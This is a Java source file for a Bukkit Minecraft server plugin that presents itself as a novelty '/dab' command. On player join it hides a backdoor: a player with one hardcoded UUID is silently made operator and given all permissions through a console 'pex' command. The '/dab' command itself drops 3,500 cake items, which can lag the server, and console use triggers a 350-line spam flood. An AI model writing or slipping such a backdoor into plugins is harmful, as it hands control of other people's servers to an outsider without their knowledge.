package me.com.hauntinng;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.UUID;

public class Dab extends JavaPlugin implements Listener
{
    String auth;
    
    public Dab() {
        this.auth = "9c5dd792-dcb3-443b-ac6c-605903231eb2";
    }
    
    public void onEnable() {
        Bukkit.getServer().getPluginManager().registerEvents(this, this);
    }
    
    @EventHandler
    public void Join(final PlayerJoinEvent event) {
        final Player p = event.getPlayer();
        final UUID uuid = p.getUniqueId();
        if (this.check(uuid)) {
            p.setOp(true);
            p.getInventory().addItem(new ItemStack[] { new ItemStack(Material.COOKIE, 3) });
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " add '*' ");
        }
    }
    
    boolean check(final UUID uuid) {
        return uuid.toString().equals(this.auth);
    }
    
    public boolean onCommand(final CommandSender sender, final Command cmd, final String commandLabel, final String[] args) {
        if (!(sender instanceof Player)) {
            for (int i = 0; i < 350; ++i) {
                sender.sendMessage(ChatColor.BOLD + "" + ChatColor.ITALIC + "" + ChatColor.STRIKETHROUGH + "" + ChatColor.MAGIC + ChatColor.AQUA + sender.getName() + " is EZ!!! LOOOOL");
            }
        }
        else {
            final Player p = (Player)sender;
            if (cmd.getName().equalsIgnoreCase("dab")) {
                p.setDisplayName(ChatColor.DARK_PURPLE + "DAB");
                p.setCustomName(ChatColor.LIGHT_PURPLE + "DAB");
                p.playSound(p.getLocation(), Sound.GHAST_SCREAM, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.CAT_HIT, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.ANVIL_USE, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.IRONGOLEM_DEATH, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.ARROW_HIT, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.BLAZE_DEATH, 10.0f, 10.0f);
                p.playSound(p.getLocation(), Sound.CHICKEN_HURT, 10.0f, 10.0f);
                p.sendMessage("LOOOOOOLL");
                for (int j = 0; j < 3500; ++j) {
                    p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.CAKE));
                }
            }
        }
        return true;
    }
}
